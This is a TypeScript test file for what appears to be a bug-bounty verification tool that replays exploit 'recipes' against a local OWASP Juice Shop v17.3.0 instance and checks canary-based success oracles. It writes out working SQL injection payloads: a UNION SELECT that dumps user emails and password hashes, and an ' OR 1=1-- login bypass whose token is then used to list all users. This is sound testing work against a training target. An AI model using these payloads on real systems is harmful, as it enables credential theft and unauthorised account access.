import assert from "node:assert/strict";
import { randomBytes } from "node:crypto";
import test from "node:test";

import { getRecipesForTarget } from "./recipes";

const CONFIG = {
  baseUrl: "http://localhost:3000",
  searchPath: "/rest/products/search",
  canaryRegistrationPath: "/api/Users/",
};

function freshCanary(): string {
  return `${randomBytes(12).toString("base64url")}@bountydesk.test`;
}

test("an unrecognized target name gets no recipes", () => {
  assert.deepEqual(getRecipesForTarget({ name: "some-other-target", config: CONFIG }), []);
});

test("a recognized target name with an unrecognized config shape gets no recipes", () => {
  assert.deepEqual(
    getRecipesForTarget({ name: "juice-shop-v17.3.0", config: { searchPath: 1 } }),
    [],
  );
  assert.deepEqual(getRecipesForTarget({ name: "juice-shop-v17.3.0", config: null }), []);
  assert.deepEqual(getRecipesForTarget({ name: "juice-shop-v17.3.0", config: "nope" }), []);
});

test("juice-shop-v17.3.0 returns both recipes now that each oracle is fully provable", () => {
  const recipes = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  assert.deepEqual(
    recipes.map((r) => r.id),
    ["juice-shop-sqli-search", "juice-shop-login-bypass"],
  );
});

test("the registration fixture matches decisions.md Q18 exactly", () => {
  const recipes = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  for (const recipe of recipes) {
    assert.deepEqual(recipe.fixture.request, {
      method: "POST",
      path: "/api/Users/",
      body: {
        email: "{{canary}}",
        password: "bd-fixture-Only1!",
        passwordRepeat: "bd-fixture-Only1!",
      },
    });
  }
});

test("sqli-search negative control and exploit match decisions.md Q18 exactly", () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });

  assert.deepEqual(sqli.negativeControl, {
    method: "GET",
    path: "/rest/products/search?q=apple",
  });

  // The frozen payload, percent-encoded as a query-string value. Computed independently here
  // (not by calling encodeURIComponent on the same literal the recipe uses) so this test would
  // actually catch a change to either side.
  assert.deepEqual(sqli.exploit, {
    method: "GET",
    path:
      "/rest/products/search?q=qwert'))%20UNION%20SELECT%20id%2Cemail%2Cpassword%2C" +
      "'4'%2C'5'%2C'6'%2C'7'%2C'8'%2C'9'%20FROM%20Users--",
  });
});

test("sqli-search oracle: canary in the injected email field (returned as \"name\") is true", async () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  const canary = freshCanary();
  const body = JSON.stringify({
    status: "success",
    data: [
      { id: 1, name: "Apple Juice", description: "Real product, no canary here" },
      { id: 2, name: canary, description: "$2a$hashedpassword" },
    ],
  });

  assert.equal(await sqli.oracleCheck({ status: 200, body }, canary), true);
});

test("sqli-search oracle: canary absent from every row is false", async () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  const canary = freshCanary();
  const body = JSON.stringify({
    status: "success",
    data: [{ id: 1, name: "Apple Juice", description: "nothing here" }],
  });

  assert.equal(await sqli.oracleCheck({ status: 200, body }, canary), false);
});

test("sqli-search oracle: canary as a coincidental substring outside the name field is false", async () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  const canary = freshCanary();
  // The canary shows up verbatim in the response -- in the injected password column (which the
  // UNION returns under "description", not "name") and in a top-level field entirely outside
  // any row. A substring search over the raw body would wrongly call this reproduced.
  const body = JSON.stringify({
    status: "success",
    data: [{ id: 1, name: "Apple Juice", description: canary }],
    debugNote: canary,
  });

  assert.equal(await sqli.oracleCheck({ status: 200, body }, canary), false);
});

test("sqli-search oracle: a non-JSON body does not throw and is false", async () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  const canary = freshCanary();
  assert.equal(await sqli.oracleCheck({ status: 500, body: "<html>not json</html>" }, canary), false);
});

test("sqli-search oracle: a JSON error response containing the canary is false", async () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  const canary = freshCanary();
  const body = JSON.stringify({ data: [{ name: canary }] });

  assert.equal(await sqli.oracleCheck({ status: 500, body }, canary), false);
});

function loginBypassRecipe() {
  const [, loginBypass] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  return loginBypass;
}

test("login-bypass negative control and exploit match decisions.md Q18 exactly", () => {
  const recipe = loginBypassRecipe();

  assert.deepEqual(recipe.negativeControl, {
    method: "POST",
    path: "/rest/user/login",
    body: { email: "{{canary}}", password: "definitely-the-wrong-password" },
  });
  assert.deepEqual(recipe.negativeControlAcceptedStatuses, [401]);

  assert.deepEqual(recipe.exploit, {
    method: "POST",
    path: "/rest/user/login",
    body: { email: "' OR 1=1--", password: "x" },
  });
});

test("login-bypass negative-control oracle: a rejected login (no token) is false", () => {
  const recipe = loginBypassRecipe();
  const canary = freshCanary();
  const body = JSON.stringify({ status: 401, message: "Invalid email or password" });

  assert.equal(recipe.oracleCheck({ status: 401, body }, canary), false);
});

test("login-bypass negative-control oracle: a token in the response is true", () => {
  const recipe = loginBypassRecipe();
  const canary = freshCanary();
  const body = JSON.stringify({ authentication: { token: "a.jwt.token", bid: 1, umail: canary } });

  assert.equal(recipe.oracleCheck({ status: 200, body }, canary), true);
});

test("login-bypass follow-up: buildRequest extracts the token as a Bearer header against /api/Users", () => {
  const recipe = loginBypassRecipe();
  const exploitResponse = {
    status: 200,
    body: JSON.stringify({ authentication: { token: "minted-jwt", bid: 1, umail: "admin@juice-sh.op" } }),
  };

  assert.deepEqual(recipe.exploitFollowUp?.buildRequest(exploitResponse), {
    method: "GET",
    path: "/api/Users",
    headers: { Authorization: "Bearer minted-jwt" },
  });
});

test("login-bypass follow-up: buildRequest returns undefined when the exploit minted no token", () => {
  const recipe = loginBypassRecipe();

  assert.equal(
    recipe.exploitFollowUp?.buildRequest({ status: 401, body: JSON.stringify({ message: "Invalid email or password" }) }),
    undefined,
  );
  assert.equal(recipe.exploitFollowUp?.buildRequest({ status: 200, body: "not json" }), undefined);
  assert.equal(recipe.exploitFollowUp?.buildRequest({ status: 200, body: JSON.stringify({}) }), undefined);
});

test("login-bypass follow-up oracle: this run's canary in /api/Users proves the token grants access", async () => {
  const recipe = loginBypassRecipe();
  const canary = freshCanary();
  const body = JSON.stringify({
    status: "success",
    data: [
      { id: 1, email: "admin@juice-sh.op", role: "admin" },
      { id: 2, email: canary, role: "customer" },
    ],
  });

  assert.equal(await recipe.exploitFollowUp?.oracleCheck({ status: 200, body }, canary), true);
});

test("login-bypass follow-up oracle: a token that opens /api/Users but without this run's canary is false", async () => {
  // This is exactly the case the withheld "was any token minted" check couldn't distinguish:
  // a real admin dump came back, but not proven to be *this run's* canary-linked proof.
  const recipe = loginBypassRecipe();
  const canary = freshCanary();
  const body = JSON.stringify({
    status: "success",
    data: [{ id: 1, email: "admin@juice-sh.op", role: "admin" }],
  });

  assert.equal(await recipe.exploitFollowUp?.oracleCheck({ status: 200, body }, canary), false);
});

test("login-bypass follow-up oracle: a non-JSON /api/Users response does not throw and is false", async () => {
  const recipe = loginBypassRecipe();
  const canary = freshCanary();

  assert.equal(await recipe.exploitFollowUp?.oracleCheck({ status: 200, body: "<html>nope</html>" }, canary), false);
});
